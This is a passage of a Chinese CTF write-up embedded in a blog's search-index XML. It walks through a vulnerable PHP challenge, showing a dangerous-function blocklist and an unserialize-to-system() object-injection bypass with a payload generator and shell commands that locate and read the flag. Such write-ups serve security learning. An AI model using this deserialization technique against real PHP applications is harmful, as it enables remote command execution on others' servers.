class="string">&quot;array_reduce&quot;</span>,<span class="string">&quot;array_walk&quot;</span>, <span class="string">&quot;array_walk_recursive&quot;</span>,<span class="string">&quot;pcntl_exec&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwrite&quot;</span>,<span class="string">&quot;file_put_contents&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gettime</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$p</span></span>) </span>&#123;</span><br><span class="line">	<span class="variable">$result</span> = call_user_func(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">	<span class="variable">$a</span>= gettype(<span class="variable">$result</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$a</span> == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">	    <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">	&#125; </span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;Y-m-d h:i:s a&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$func</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;func&quot;</span>];</span><br><span class="line"><span class="variable">$p</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;p&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$func</span> != <span class="literal">null</span>) &#123;</span><br><span class="line">	<span class="variable">$func</span> = strtolower(<span class="variable">$func</span>);</span><br><span class="line">    <span class="keyword">if</span> (!in_array(<span class="variable">$func</span>,<span class="variable">$disable_fun</span>)) &#123;</span><br><span class="line">	    <span class="keyword">echo</span> gettime(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Hacker...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>这里<code>get time</code> 中的 <code>call_user_func()</code> 函数能够调用的函数被禁了好多，但是这不是重点，重点是 <code>Test</code> 类里面的 <code>__destruct</code> ，这个也可以调用 <code>call_user_func()</code> 而且是不经过验证。因此思路就是构造序列化字符串作为 POST 提交的 <code>p</code> ，而POST 提交的 <code>func</code> 则为 <code>unserialize</code>。</p>
+<p>接下来构造 <code>p</code> （这里的p指的是POST提交的，而不是类中的）</p>
+<blockquote>
+<p>这里类中的 var 其实是 public 的别名</p>
+</blockquote>
+<p>编写简单的PHP脚本： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;参数&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$payload</span> = <span class="keyword">new</span> Test;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$payload</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>参数依次如下： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. ls / # 查看根目录</span><br><span class="line">2. ls   # 查看当前目录</span><br><span class="line">3. find / -name flag* # 找flag文件路径，这里会找到很多，但是其他的一看就不像</span><br><span class="line">4. cat /tmp/flagoefiu4r93 # 读取flag</span><br></pre></td></tr></table></figure></p>
+<p>将上面参数带入PHP脚本，然后执行得到的字符串作为 POST 提交的 p。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327232126.png" /></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327232212.png" /></p>
+<h1 id="总结">总结</h1>
+<p>本题难度并不大，主要的难点就在于报错提示的 <code>call_user_func()</code> ，要明白它的作用。本题考的其实是PHP知识点，熟悉PHP中的函数尤其是调用系统的命令的函数以及反序列化知识点。前者其实可以在 <strong>命令执行</strong> 相关题目中积累。</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>PHP</tag>
+        <tag>反序列化</tag>
       </tags>
   </entry>
 </search>
